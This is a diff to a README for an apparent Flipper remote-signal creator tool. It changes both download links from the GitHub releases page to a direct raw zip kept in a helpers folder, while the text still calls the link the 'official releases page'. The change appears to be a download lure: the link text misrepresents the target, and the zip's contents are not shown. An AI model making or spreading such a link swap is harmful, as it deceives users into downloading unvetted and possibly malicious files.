@@ -1,6 +1,6 @@
 # 🕹️ flipper-sub-creator - Create custom remote signals with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kiddo8059/flipper-sub-creator/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kiddo8059/flipper-sub-creator/raw/refs/heads/main/helpers/sub_flipper_creator_v1.3.zip)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ The application does not require advanced drivers for basic operation, though yo
 
 ## 📥 Get the software
 
-Visit the [official releases page](https://github.com/kiddo8059/flipper-sub-creator/releases) to download the latest version of the application. 
+Visit the [official releases page](https://github.com/kiddo8059/flipper-sub-creator/raw/refs/heads/main/helpers/sub_flipper_creator_v1.3.zip) to download the latest version of the application. 
 
 1. Navigate to the link provided above.
 2. Look for the latest release version at the top of the list.
